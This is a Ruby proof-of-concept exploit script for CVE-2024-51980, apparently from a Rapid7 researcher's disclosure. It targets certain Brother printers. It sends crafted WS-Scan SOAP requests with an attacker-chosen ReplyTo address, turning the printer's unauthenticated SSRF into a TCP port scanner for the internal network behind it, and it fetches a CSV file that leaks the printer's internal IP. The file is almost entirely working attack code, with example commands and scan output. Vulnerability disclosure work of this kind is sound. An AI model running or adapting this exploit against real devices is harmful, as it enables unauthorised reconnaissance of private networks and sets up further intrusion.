# frozen_string_literal: true
# =========================================================================================
# CVE-2024-51980: An unauthenticated attacker can force the device to open a TCP connection
# =========================================================================================
#
# Verified on the following:
# * Brother MFC-L9570CDW (MAIN: ZL2403011354, SUB1: 1.32)
# * Brother MFC-L9570CDW (MAIN: ZK2309081840, SUB1: 1.31) 
#
# Example usage:
#   gem install httparty
#   ruby CVE-2024-51980.rb
#
#   ruby CVE-2024-51980.rb --printer_ip 10.10.10.2
#   The printers internal IP address is: 192.168.86.62
#
# Leverage the SSRF to TCP port scan an internal network via a target device with an exposed external interface:
#
#   ruby CVE-2024-51980.rb --printer_ip 10.10.10.2 --scan_ip 192.168.86.1/24 --delay 0 --scan_port 80,443
#   Scanning: 192.168.86.0
#   Scanning: 192.168.86.1
#       [OPEN] 192.168.86.1:80
#       [OPEN] 192.168.86.1:443
#   Scanning: 192.168.86.2
#       [OPEN] 192.168.86.2:80
#       [OPEN] 192.168.86.2:443
#   Scanning: 192.168.86.3
#
# Credit: Stephen Fewer, Principal Security Researcher at Rapid7
# =========================================================================================
require 'httparty'
require 'securerandom'
require 'ipaddr'
require 'csv'
require 'optparse'

HTTParty::Basement.default_options.update(verify: false)

class BrotherPortScan

	def initialize(printer_scheme, printer_ip, printer_port, printer_soap_endpoint)
		@printer_soap_url = "#{printer_scheme}://#{printer_ip}:#{printer_port}#{printer_soap_endpoint}"
		@printer_mnt_info_url = "#{printer_scheme}://#{printer_ip}:#{printer_port}/etc/mnt_info.csv"
	end

	def internal_ip
		response = HTTParty.get(@printer_mnt_info_url)
		
		return nil unless response&.body
	
		csv = CSV.new(response.body)
		
		ip_address_index = nil
		
		csv.each do |row|
			if ip_address_index.nil?
				ip_address_index = row.index('IP Address')
			else
				return row[ip_address_index]
			end
		end
		
		nil
	end
	
	def scan_port(ip, port)

		tag_uuid = SecureRandom.uuid

		request_xml = %{<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope"
xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
xmlns:wscn="http://schemas.microsoft.com/windows/2006/08/wdp/scan">
	<SOAP-ENV:Header>
		<wsa:MessageID>urn:uuid:#{SecureRandom.uuid}</wsa:MessageID>
		<wsa:Action>https://schemas.microsoft.com/windows/2006/01/wdp/scan/GetActiveJobsRequest</wsa:Action>
		<wsa:To>urn:microsoft.com:windows:2006:01:wdp:scan</wsa:To>
		<wsa:ReplyTo><wsa:Address>http://#{ip}:#{port}/#{tag_uuid}</wsa:Address></wsa:ReplyTo>
	</SOAP-ENV:Header>
	<SOAP-ENV:Body>
		<wscn:GetActiveJobsRequest/>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>}

		response = HTTParty.post(@printer_soap_url, body: request_xml, headers: { 'Content-Type' => 'application/soap+xml' })

		response&.body.include? tag_uuid
	rescue Net::ReadTimeout
		nil
	end
end

# Note: "Web Services" (i.e. SOAP) is only exposed via the printers HTTP service (port 80) and not the HTTPS service (port 443), or IPP service (port 631).
options = {
	printer_scheme: 'http',
	printer_ip: nil,
	printer_port: 80,
	printer_endpoint: '/StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery',
	scan_ip: nil,
	ports: (1..0xffff).to_a,
	delay: 1
}

OptionParser.new do |opt|
  opt.on('--printer_scheme http') { |o| options[:printer_scheme] = o }
  opt.on('--printer_ip IP') { |o| options[:printer_ip] = o }
  opt.on('--printer_port PORT') { |o| options[:printer_port] = o.to_i }
  opt.on('--printer_endpoint ENDPOINT') { |o| options[:printer_endpoint] = o }
  opt.on('--delay SECONDS') { |o| options[:delay] = o.to_i }
  opt.on('--scan_ip IP') { |o| options[:scan_ip] = o }
  opt.on('--scan_port PORT,PORT,PORT') { |o| options[:ports].clear; o.split(',').each { |p| options[:ports] << p.to_i } }
end.parse!

if options[:printer_ip].nil?
	$stderr.puts("You must specify a target printer IP via --printer_ip")
	Kernel.exit -1
end

bps = BrotherPortScan.new(
	options[:printer_scheme],
	options[:printer_ip],
	options[:printer_port],
	options[:printer_endpoint]
)

if options[:scan_ip]

	IPAddr.new(options[:scan_ip]).to_range.each do|ip|
		$stdout.puts("Scanning: #{ip}")

		options[:ports].each do |port|

			open = bps.scan_port(ip, port)

			$stdout.puts "    [OPEN] #{ip}:#{port}" if open
			
			sleep(options[:delay])
		end
	end
else
	$stdout.puts("The printers internal IP address is: #{bps.internal_ip}")
end
